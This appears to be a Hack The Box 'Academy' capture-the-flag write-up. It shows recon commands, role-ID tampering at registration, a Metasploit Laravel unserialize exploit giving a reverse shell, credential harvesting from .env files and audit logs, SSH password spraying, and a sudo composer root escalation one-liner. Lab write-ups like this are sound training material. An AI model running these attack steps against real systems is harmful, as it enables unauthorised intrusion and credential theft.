@@ -1,0 +1,488 @@
+Academy Hack The Box
+
+Attacking php, find old developer site and leaks application key and encrypt a serialized payload and get code execution. Aplicaton key used
+for users like a cookie to trust. 
+
+We go to the webpage at 10.10.10.215 and we get nothing however we do see it trying to load "academy.htb" so we are going to curl and see 
+what we get.
+
+
+We add academy.htb to our hosts file and we now can access in our webserver, after that we try to see what knid of framework is running the 
+apacher server. We tag  index.php to the end of the website and we get a clean hit. http://academy.htb//index.php
+
+We will start some recon and run gobuster from the getgo, we run two go busters one bruteforcing webpages while the other is bruteforcing subdomains
+We also use burpsuite to intercept the login and copy the login request to be used as a template for brute force using sql map
+Commands and Output:
+=============================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/academy/requests]
+└──╼ $sqlmap -r login.req --batch
+┌─[user@parrot-virtual]─[~/htb/academy/requests]
+└──╼ $sqlmap -r login.req --batch --level 5 --risk 3
+=============================================================================================================================================
+
+After having all of those things running in the background, we can attempt to register an account with the website, user hacker pass hacker
+
+
+Egre55 user is hardcoded for the website. We get the results from the gobuster and we find the following:
+Commands and Output:
+=============================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/academy/gobuster]
+└──╼ $grep -v 403 dir-root.log 
+/admin.php            (Status: 200) [Size: 2633]
+/index.php            (Status: 200) [Size: 2117]
+/images               (Status: 301) [Size: 311] [--> http://academy.htb/images/]
+/register.php         (Status: 200) [Size: 3003]
+/config.php           (Status: 200) [Size: 0]
+/home.php             (Status: 302) [Size: 55034] [--> login.php]
+/login.php            (Status: 200) [Size: 2627]
+/.                    (Status: 200) [Size: 2117]
+=============================================================================================================================================
+
+We look in depth into the config and admin php pages but nothing interesting in any of the pages so we will next look at the register php page 
+in depth and see what we can find.
+
+An interesting parameter is the role id found in the request
+
+Commands and Output:
+=============================================================================================================================================
+POST /register.php HTTP/1.1
+Host: academy.htb
+User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 54
+Origin: http://academy.htb
+DNT: 1
+Connection: close
+Referer: http://academy.htb/register.php
+Cookie: PHPSESSID=bd35vahck4bvhv504v8o5nks3p
+Upgrade-Insecure-Requests: 1
+Sec-GPC: 1
+
+uid=admin+&password=password&confirm=password&roleid=0
+
+=============================================================================================================================================
+
+
+Interesting observation is that we can create users with a space in the name. The key thing to observe in the register page is the role id paramter
+when registering and the admin page. To further gain access to the website one must first create a new user with a role id set to 1 and upon 
+successfully registering the user for the first time usng burpsuite to make the modifications, one can then use the admin page to authenticate as 
+an administrator on the website.
+
+We get the follwoing planner once we have logged in:
+Commands and Output:
+=============================================================================================================================================
+
+Academy Launch Planner
+Item 	Status
+Complete initial set of modules (cry0l1t3 / mrb3n) 	done
+Finalize website design 	done
+Test all modules 	done
+Prepare launch campaign 	done
+Separate student and admin roles 	done
+Fix issue with dev-staging-01.academy.htb 	pending
+
+=============================================================================================================================================
+
+The key thing about the planner is the dev-staging subdomain, we can now add this to our hosts file and try to access it.
+After going to the vhost page we are able to see that "laravel" is the framework. We can go ahead and try to search for any exploits available.
+Commands and Output:
+=============================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/academy/nmap]
+└──╼ $searchsploit laravel
+---------------------------------------------------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                                                                        |  Path
+---------------------------------------------------------------------------------------------------------------------- ---------------------------------
+Laravel - 'Hash::make()' Password Truncation Security                                                                 | multiple/remote/39318.txt
+Laravel 8.4.2 debug mode - Remote code execution                                                                      | php/webapps/49424.py
+Laravel Administrator 4 - Unrestricted File Upload (Authenticated)                                                    | php/webapps/49112.py
+Laravel Log Viewer < 0.13.0 - Local File Download                                                                     | php/webapps/44343.py
+Laravel Nova 3.7.0 - 'range' DoS                                                                                      | php/webapps/49198.txt
+PHP Laravel Framework 5.5.40 / 5.6.x < 5.6.30 - token Unserialize Remote Command Execution (Metasploit)               | linux/remote/47129.rb
+UniSharp Laravel File Manager 2.0.0 - Arbitrary File Read                                                             | php/webapps/48166.txt
+UniSharp Laravel File Manager 2.0.0-alpha7 - Arbitrary File Upload                                                    | php/webapps/46389.py
+---------------------------------------------------------------------------------------------------------------------- ---------------------------------
+Shellcodes: No Results
+
+=============================================================================================================================================
+
+Based on the results we can go ahead and try and use metasploit to gain access using the rce
+Commands and Output:
+=============================================================================================================================================
+msf6 > search laravel
+
+Matching Modules
+================
+
+   #  Name                                              Disclosure Date  Rank       Check  Description
+   -  ----                                              ---------------  ----       -----  -----------
+   0  exploit/unix/http/laravel_token_unserialize_exec  2018-08-07       excellent  Yes    PHP Laravel Framework token Unserialize Remote Command Execution
+
+
+Interact with a module by name or index. For example info 0, use 0 or use exploit/unix/http/laravel_token_unserialize_exec
+
+=============================================================================================================================================
+
+We now have to search for an app key so we can supply to the exploit for use, we find it in the static web page, we as well find the sql user
+and password.
+Commands and Output:
+=============================================================================================================================================
+APP_KEY 	"base64:dBLUaMuZz7Iq06XtL/Xnz/90Ejq+DEEynggqubHWFj0="
+
+LOG_CHANNEL 	"stack"
+DB_CONNECTION 	"mysql"
+DB_HOST 	"127.0.0.1"
+DB_PORT 	"3306"
+DB_DATABASE 	"homestead"
+DB_USERNAME 	"homestead"
+DB_PASSWORD 	"secret"
+
+=============================================================================================================================================
+
+We set the app key as well as other options on metasploit to get the webshell from the application
+Commands and Output:
+=============================================================================================================================================
+msf6 exploit(unix/http/laravel_token_unserialize_exec) > 
+msf6 exploit(unix/http/laravel_token_unserialize_exec) > set APP_KEY dBLUaMuZz7Iq06XtL/Xnz/90Ejq+DEEynggqubHWFj0=
+APP_KEY => dBLUaMuZz7Iq06XtL/Xnz/90Ejq+DEEynggqubHWFj0=
+msf6 exploit(unix/http/laravel_token_unserialize_exec) > set Proxies http:127.0.0.1:8080
+Proxies => http:127.0.0.1:8080
+msf6 exploit(unix/http/laravel_token_unserialize_exec) > options
+
+Module options (exploit/unix/http/laravel_token_unserialize_exec):
+
+   Name       Current Setting                               Required  Description
+   ----       ---------------                               --------  -----------
+   APP_KEY    dBLUaMuZz7Iq06XtL/Xnz/90Ejq+DEEynggqubHWFj0=  no        The base64 encoded APP_KEY string from the .env file
+   Proxies    http:127.0.0.1:8080                           no        A proxy chain of format type:host:port[,type:host:port][...]
+   RHOSTS                                                   yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path
+                                                                      >'
+   RPORT      80                                            yes       The target port (TCP)
+   SSL        false                                         no        Negotiate SSL/TLS for outgoing connections
+   TARGETURI  /                                             yes       Path to target webapp
+   VHOST                                                    no        HTTP server virtual host
+
+
+Payload options (cmd/unix/reverse_perl):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST                   yes       The listen address (an interface may be specified)
+   LPORT  4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic
+
+
+msf6 exploit(unix/http/laravel_token_unserialize_exec) > set rhosts 10.10.14.23
+rhosts => 10.10.14.23
+msf6 exploit(unix/http/laravel_token_unserialize_exec) > set rhosts dev-staging-01.academy.htb
+msf6 exploit(unix/http/laravel_token_unserialize_exec) > set lhost tun0 
+lhost => 10.10.14.23
+msf6 exploit(unix/http/laravel_token_unserialize_exec) > set lport 9001
+lport => 9001
+msf6 exploit(unix/http/laravel_token_unserialize_exec) > show options
+
+=============================================================================================================================================
+
+We can turn the burp intercept off and see the application run. Once we get the webshell, we can examine the interactions taken by metasploit
+to get access through the laravel framework.
+
+Commands and Output:
+=============================================================================================================================================
+POST /index.php HTTP/1.1
+
+Host: dev-staging-01.academy.htb
+
+User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)
+
+X-XSRF-TOKEN: eyJpdiI6InRYTHlsclJlQW5ZTVgzRG5vd0w1OVE9PSIsInZhbHVlIjoiZEdoSEd1ajdGcXJCZXNESlI2T0JZTmlnV3RadFZyTXNUS09SWTdrNmpsM2tzYXc3WERLdkU4aExlWVZLK3ZyVEozb0t5dFlXblpLdFZwU2Z2VmVINEpTd0xpTkVNZUlrSFpwSm5DSWZXOTB2YU9rc1c0cVpTWllpdGVLOENqeEJZT20rTlFXSkI5a3ZtZnBrVkdcL0RJQWg5a2UycHFRSVZKZ1lNSHpOcHZCc3YyK2x3VUczK1lwZDMxMXVtMXhWaXAwd1wvV2pLUWdWZEZBckVTZCtEOWQwRFwvRUZPMytjK3BsSFR4bU96QmtwTWlkXC9tT1FmWUVjWWVBWTNMc2VnTmhnSjBremlQYTlDa0RyWEFHaUl0cFd4WlpiNGlGTkdtOFllZVFrRGZNS1BPZG1cL2NIamlKNWNGN09SQVpYSktkcFwvTlFlVWUzeGZoU2VSem9Wa1RCZnptaWJMS0xkVE9ZcTY3K210TnhZV0ZEekZTWE9meU16TjNvNlFqcGpTbTB2Rlp4bkJIWGk1bkVxUHFBQ1VzZ05BdDNva0ZramgrWVhpazBQSUhoTjJZc1QyeVlEc2NJQ1wvaVNVMHRoT055cEpcL1hVQ1pcL0dsQTFKb0hWM2QxRGNLZ0ZHWTFGU21iMDZNYjh1Tlk4aVR2TzdFT2lCWlIzT2FiSEtPU2tDV2tsa2g3ZEJ4WEx2V2sweUU2Z1FOSFl6VllaZHoxUyt4Z2xDVkxEZWtLVVMrenRvPSIsIm1hYyI6IjY4NGFmZTUyYWVmN2I0YjYxODIwYTE5MjY0OTQ5NzEzMDVlZTA3Y2Q4NTMxMjlkZDg0MzE4OTljOWJlMTY2MDMifQ==
+
+Content-Type: application/x-www-form-urlencoded
+
+Content-Length: 0
+
+Connection: close
+
+
+=============================================================================================================================================
+
+What we can see id that the laravel application created an xsrf token which is stored in base64 and from there it was able to encrypt a token
+Commands and Output:
+=============================================================================================================================================
+└──╼ $echo -n eyJpdiI6InRYTHlsclJlQW5ZTVgzRG5vd0w1OVE9PSIsInZhbHVlIjoiZEdoSEd1ajdGcXJCZXNESlI2T0JZTmlnV3RadFZyTXNUS09SWTdrNmpsM2tzYXc3WERLdkU4aExlWVZLK3ZyVEozb0t5dFlXblpLdFZwU2Z2VmVINEpTd0xpTkVNZUlrSFpwSm5DSWZXOTB2YU9rc1c0cVpTWllpdGVLOENqeEJZT20rTlFXSkI5a3ZtZnBrVkdcL0RJQWg5a2UycHFRSVZKZ1lNSHpOcHZCc3YyK2x3VUczK1lwZDMxMXVtMXhWaXAwd1wvV2pLUWdWZEZBckVTZCtEOWQwRFwvRUZPMytjK3BsSFR4bU96QmtwTWlkXC9tT1FmWUVjWWVBWTNMc2VnTmhnSjBremlQYTlDa0RyWEFHaUl0cFd4WlpiNGlGTkdtOFllZVFrRGZNS1BPZG1cL2NIamlKNWNGN09SQVpYSktkcFwvTlFlVWUzeGZoU2VSem9Wa1RCZnptaWJMS0xkVE9ZcTY3K210TnhZV0ZEekZTWE9meU16TjNvNlFqcGpTbTB2Rlp4bkJIWGk1bkVxUHFBQ1VzZ05BdDNva0ZramgrWVhpazBQSUhoTjJZc1QyeVlEc2NJQ1wvaVNVMHRoT055cEpcL1hVQ1pcL0dsQTFKb0hWM2QxRGNLZ0ZHWTFGU21iMDZNYjh1Tlk4aVR2TzdFT2lCWlIzT2FiSEtPU2tDV2tsa2g3ZEJ4WEx2V2sweUU2Z1FOSFl6VllaZHoxUyt4Z2xDVkxEZWtLVVMrenRvPSIsIm1hYyI6IjY4NGFmZTUyYWVmN2I0YjYxODIwYTE5MjY0OTQ5NzEzMDVlZTA3Y2Q4NTMxMjlkZDg0MzE4OTljOWJlMTY2MDMifQ== | base64 -d | sed 's/,/\n/g'
+{"iv":"tXLylrReAnYMX3DnowL59Q=="
+"value":"dGhHGuj7FqrBesDJR6OBYNigWtZtVrMsTKORY7k6jl3ksaw7XDKvE8hLeYVK+vrTJ3oKytYWnZKtVpSfvVeH4JSwLiNEMeIkHZpJnCIfW90vaOksW4qZSZYiteK8CjxBYOm+NQWJB9kvmfpkVG\/DIAh9ke2pqQIVJgYMHzNpvBsv2+lwUG3+Ypd311um1xVip0w\/WjKQgVdFArESd+D9d0D\/EFO3+c+plHTxmOzBkpMid\/mOQfYEcYeAY3LsegNhgJ0kziPa9CkDrXAGiItpWxZZb4iFNGm8YeeQkDfMKPOdm\/cHjiJ5cF7ORAZXJKdp\/NQeUe3xfhSeRzoVkTBfzmibLKLdTOYq67+mtNxYWFDzFSXOfyMzN3o6QjpjSm0vFZxnBHXi5nEqPqACUsgNAt3okFkjh+YXik0PIHhN2YsT2yYDscIC\/iSU0thONypJ\/XUCZ\/GlA1JoHV3d1DcKgFGY1FSmb06Mb8uNY8iTvO7EOiBZR3OabHKOSkCWklkh7dBxXLvWk0yE6gQNHYzVYZdz1S+xglCVLDekKUS+zto="
+"mac":"684afe52aef7b4b61820a1926494971305ee07cd853129dd8431899c9be16603"}┌
+
+With Value being the encrypted token
+=============================================================================================================================================
+
+Once we obtained our access we tried to get sql information by using the credentials obtained from the static homepage however those did not work.
+The next thing to do was examine configuraton file for academy in the following directory: /var/www/html/academy
+
+Commands and Output:
+=============================================================================================================================================
+www-data@academy:/var/www/html$ cd htb-academy-dev-01/
+www-data@academy:/var/www/html/htb-academy-dev-01$ ls
+app	   composer.json  database	public	   routes      tests
+artisan    composer.lock  package.json	readme.md  server.php  vendor
+bootstrap  config	  phpunit.xml	resources  storage     webpack.mix.js
+
+cd database
+=============================================================================================================================================
+
+We then look at config insdie database.php and find another set of sql user and password
+
+Commands and Output:
+=============================================================================================================================================
+mysql -u forge -d forge -p -h localhost
+=============================================================================================================================================
+
+We try using that however it stil does not work, we also go into the academy directory and try to obtain the database password and user from the
+config file 
+
+Commands and Output:
+=============================================================================================================================================
+www-data@academy:/var/www/html/academy$ cd config/
+www-data@academy:/var/www/html/academy/config$ 
+www-data@academy:/var/www/html/academy/config$ ls
+app.php   broadcasting.php  database.php     hashing.php  mail.php   services.php  view.php
+auth.php  cache.php	    filesystems.php  logging.php  queue.php  session.php
+www-data@academy:/var/www/html/academy/config$ grep -Ri password .
+./cache.php:                env('MEMCACHED_PASSWORD'),
+./mail.php:    | connection. You may also set the "password" value below this one.
+./mail.php:    'password' => env('MAIL_PASSWORD'),
+./database.php:            'password' => env('DB_PASSWORD', ''),
+./database.php:            'password' => env('DB_PASSWORD', ''),
+./database.php:            'password' => env('DB_PASSWORD', ''),
+./database.php:            'password' => env('REDIS_PASSWORD', null),
+./auth.php:    | This option controls the default authentication "guard" and password
+./auth.php:        'passwords' => 'users',
+./auth.php:    | Resetting Passwords
+./auth.php:    | You may specify multiple password reset configurations if you have more
+./auth.php:    | separate password reset settings based on the specific user types.
+./auth.php:    'passwords' => [
+./auth.php:            'table' => 'password_resets',
+./hashing.php:    | passwords for your application. By default, the bcrypt algorithm is
+./app.php:        Illuminate\Auth\Passwords\PasswordResetServiceProvider::class,
+./app.php:        'Password' => Illuminate\Support\Facades\Password::class,
+
+=============================================================================================================================================
+
+It is apparently pulling environment varaibles so we can try and get a look at .env
+
+Commands and Output:
+=============================================================================================================================================
+www-data@academy:/var/www/html/academy$ ls -a
+.   .env	  .gitattributes  app	   bootstrap	  composer.lock  database      phpunit.xml  readme.md  routes	   storage  vendor
+..  .env.example  .gitignore	  artisan  composer.json  config	 package.json  public	    resources  server.php  tests    webpack.mix.js
+www-data@academy:/var/www/html/academy$ cat .env
+APP_NAME=Laravel
+APP_ENV=local
+APP_KEY=base64:dBLUaMuZz7Iq06XtL/Xnz/90Ejq+DEEynggqubHWFj0=
+APP_DEBUG=false
+APP_URL=http://localhost
+
+LOG_CHANNEL=stack
+
+DB_CONNECTION=mysql
+DB_HOST=127.0.0.1
+DB_PORT=3306
+DB_DATABASE=academy
+DB_USERNAME=dev
+DB_PASSWORD=mySup3rP4s5w0rd!!
+
+BROADCAST_DRIVER=log
+CACHE_DRIVER=file
+SESSION_DRIVER=file
+SESSION_LIFETIME=120
+QUEUE_DRIVER=sync
+
+REDIS_HOST=127.0.0.1
+REDIS_PASSWORD=null
+REDIS_PORT=6379
+
+MAIL_DRIVER=smtp
+MAIL_HOST=smtp.mailtrap.io
+MAIL_PORT=2525
+MAIL_USERNAME=null
+MAIL_PASSWORD=null
+MAIL_ENCRYPTION=null
+
+PUSHER_APP_ID=
+PUSHER_APP_KEY=
+PUSHER_APP_SECRET=
+PUSHER_APP_CLUSTER=mt1
+
+MIX_PUSHER_APP_KEY="${PUSHER_APP_KEY}"
+MIX_PUSHER_APP_CLUSTER="${PUSHER_APP_CLUSTER}"
+
+=============================================================================================================================================
+
+We come accross a new user and password, however we using these for the sql service do not work so instead we will use the saved password against 
+all the users in the system and see if we can get in.
+
+Commands and Output:
+=============================================================================================================================================
+www-data@academy:/var/www$ cat /etc/passwd | grep sh$ | awk -F: {'print $1'}
+root
+egre55
+mrb3n
+cry0l1t3
+21y4d
+ch4p
+g0blin
+
+=============================================================================================================================================
+
+We now use crackmapexec to try and get access via ssh
+Commands and Output:
+=============================================================================================================================================
+┌─[✗]─[user@parrot-virtual]─[/opt/CrackMapExec]
+└──╼ $crackmapexec ssh academy.htb -u ~/htb/academy/users -p ~/htb/academy/pw 
+[*] First time use detected
+[*] Creating home directory structure
+[*] Creating default workspace
+[*] Initializing LDAP protocol database
+[*] Initializing MSSQL protocol database
+[*] Initializing SMB protocol database
+[*] Initializing SSH protocol database
+[*] Initializing WINRM protocol database
+[*] Copying default configuration file
+[*] Generating SSL certificate
+SSH         10.10.10.215    22     academy.htb      [*] SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.1
+SSH         10.10.10.215    22     academy.htb      [-] root:mySup3rP4s5w0rd!! Authentication failed.
+SSH         10.10.10.215    22     academy.htb      [-] egre55:mySup3rP4s5w0rd!! Authentication failed.
+SSH         10.10.10.215    22     academy.htb      [-] mrb3n:mySup3rP4s5w0rd!! Authentication failed.
+SSH         10.10.10.215    22     academy.htb      [+] cry0l1t3:mySup3rP4s5w0rd!! 
+
+=============================================================================================================================================
+
+It works and we can use the cry0l1t3:mySup3rP4s5w0rd!! user/password.
+Once logged in we are able to see we are part of the adm group which allows us access to the /var/log directory which we can snoop in.
+
+One thing to lookat is the audit directory, there is a special command that prints statistics and command history of things that have been typed
+on the command line known as "aureport" 
+
+
+If we look at the aureport help we see we can look at the tty history
+Commands and Output:
+=============================================================================================================================================
+cry0l1t3@academy:/var/log/audit$ aureport --help
+usage: aureport [options]
+	-a,--avc			Avc report
+	-au,--auth			Authentication report
+	--comm				Commands run report
+	-c,--config			Config change report
+	-cr,--crypto			Crypto report
+	-e,--event			Event report
+	-f,--file			File name report
+	--failed			only failed events in report
+	-h,--host			Remote Host name report
+	--help				help
+	-i,--interpret			Interpretive mode
+	-if,--input <Input File name>	use this file as input
+	--input-logs			Use the logs even if stdin is a pipe
+	--integrity			Integrity event report
+	-l,--login			Login report
+	-k,--key			Key report
+	-m,--mods			Modification to accounts report
+	-ma,--mac			Mandatory Access Control (MAC) report
+	-n,--anomaly			aNomaly report
+	-nc,--no-config			Don't include config events
+	--node <node name>		Only events from a specific node
+	-p,--pid			Pid report
+	-r,--response			Response to anomaly report
+	-s,--syscall			Syscall report
+	--success			only success events in report
+	--summary			sorted totals for main object in report
+	-t,--log			Log time range report
+	-te,--end [end date] [end time]	ending date & time for reports
+	-tm,--terminal			TerMinal name report
+	-ts,--start [start date] [start time]	starting data & time for reports
+	--tty				Report about tty keystrokes
+	-u,--user			User name report
+	-v,--version			Version
+	--virt				Virtualization report
+	-x,--executable			eXecutable name report
+	If no report is given, the summary report will be displayed
+
+
+=============================================================================================================================================
+
+
+We can now run and execute aureport
+Commands and Output:
+=============================================================================================================================================
+cry0l1t3@academy:/var/log/audit$ aureport --tty
+
+TTY Report
+===============================================
+# date time event auid term sess comm data
+===============================================
+Error opening config file (Permission denied)
+NOTE - using built-in logs: /var/log/audit/audit.log
+1. 08/12/20 02:28:10 83 0 ? 1 sh "su mrb3n",<nl>
+2. 08/12/20 02:28:13 84 0 ? 1 su "mrb3n_Ac@d3my!",<nl>
+3. 08/12/20 02:28:24 89 0 ? 1 sh "whoami",<nl>
+4. 08/12/20 02:28:28 90 0 ? 1 sh "exit",<nl>
+5. 08/12/20 02:28:37 93 0 ? 1 sh "/bin/bash -i",<nl>
+6. 08/12/20 02:30:43 94 0 ? 1 nano <delete>,<delete>,<delete>,<delete>,<delete>,<down>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<down>,<delete>,<delete>,<delete>,<delete>,<delete>,<down>,<delete>,<delete>,<delete>,<delete>,<delete>,<down>,<delete>,<delete>,<delete>,<delete>,<delete>,<^X>,"y",<ret>
+7. 08/12/20 02:32:13 95 0 ? 1 nano <down>,<up>,<up>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<down>,<backspace>,<down>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<^X>,"y",<ret>
+8. 08/12/20 02:32:55 96 0 ? 1 nano "6",<^X>,"y",<ret>
+9. 08/12/20 02:33:26 97 0 ? 1 bash "ca",<up>,<up>,<up>,<backspace>,<backspace>,"cat au",<tab>,"| grep data=",<ret>,"cat au",<tab>,"| cut -f11 -d\" \"",<ret>,<up>,<left>,<left>,<left>,<left>,<left>,<left>,<left>,<left>,<left>,<left>,<left>,<left>,<left>,<left>,<left>,<left>,<right>,<right>,"grep data= | ",<ret>,<up>," > /tmp/data.txt",<ret>,"id",<ret>,"cd /tmp",<ret>,"ls",<ret>,"nano d",<tab>,<ret>,"cat d",<tab>," | xx",<tab>,"-r -p",<ret>,"ma",<backspace>,<backspace>,<backspace>,"nano d",<tab>,<ret>,"cat dat",<tab>," | xxd -r p",<ret>,<up>,<left>,"-",<ret>,"cat /var/log/au",<tab>,"t",<tab>,<backspace>,<backspace>,<backspace>,<backspace>,<backspace>,<backspace>,"d",<tab>,"aud",<tab>,"| grep data=",<ret>,<up>,<up>,<up>,<up>,<up>,<down>,<ret>,<up>,<up>,<up>,<ret>,<up>,<up>,<up>,<ret>,"exit",<backspace>,<backspace>,<backspace>,<backspace>,"history",<ret>,"exit",<ret>
+10. 08/12/20 02:33:26 98 0 ? 1 sh "exit",<nl>
+11. 08/12/20 02:33:30 107 0 ? 1 sh "/bin/bash -i",<nl>
+12. 08/12/20 02:33:36 108 0 ? 1 bash "istory",<ret>,"history",<ret>,"exit",<ret>
+13. 08/12/20 02:33:36 109 0 ? 1 sh "exit",<nl>
+
+=============================================================================================================================================
+
+We are able to see that user "mrb3n" was utilized as well as a password "mrb3n_Ac@d3my!"
+
+We can now attempt su into the new user and we are successful
+
+Commands and Output:
+=============================================================================================================================================
+cry0l1t3@academy:/var/log/audit$ su - mrb3n
+Password: 
+$ ls
+$ bash
+mrb3n@academy:~$ ls
+mrb3n@academy:~$ sudo -l
+[sudo] password for mrb3n: 
+Matching Defaults entries for mrb3n on academy:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User mrb3n may run the following commands on academy:
+    (ALL) /usr/bin/composer
+
+=============================================================================================================================================
+
+Based on the output the user can use sudo -l to run as root and using "/usr/bin/compser":
+
+We can now go to gtfobins to seek a sudo root escalation on the following "https://gtfobins.github.io/gtfobins/composer/"
+Commands and Output:
+=============================================================================================================================================
+mrb3n@academy:~$ echo '{"scripts":{"x":"/bin/sh -i 0<&3 1>&3 2>&3"}}' >$TF/composer.json
+mrb3n@academy:~$ sudo composer --working-dir=$TF run-script x
+[sudo] password for mrb3n: 
+PHP Warning:  PHP Startup: Unable to load dynamic library 'mysqli.so' (tried: /usr/lib/php/20190902/mysqli.so (/usr/lib/php/20190902/mysqli.so: undefined symbol: mysqlnd_global_stats), /usr/lib/php/20190902/mysqli.so.so (/usr/lib/php/20190902/mysqli.so.so: cannot open shared object file: No such file or directory)) in Unknown on line 0
+PHP Warning:  PHP Startup: Unable to load dynamic library 'pdo_mysql.so' (tried: /usr/lib/php/20190902/pdo_mysql.so (/usr/lib/php/20190902/pdo_mysql.so: undefined symbol: mysqlnd_allocator), /usr/lib/php/20190902/pdo_mysql.so.so (/usr/lib/php/20190902/pdo_mysql.so.so: cannot open shared object file: No such file or directory)) in Unknown on line 0
+Do not run Composer as root/super user! See https://getcomposer.org/root for details
+> /bin/sh -i 0<&3 1>&3 2>&3
+# whoami
+root
+
+=============================================================================================================================================
+
+We are now root as a result.
+DONE.
+
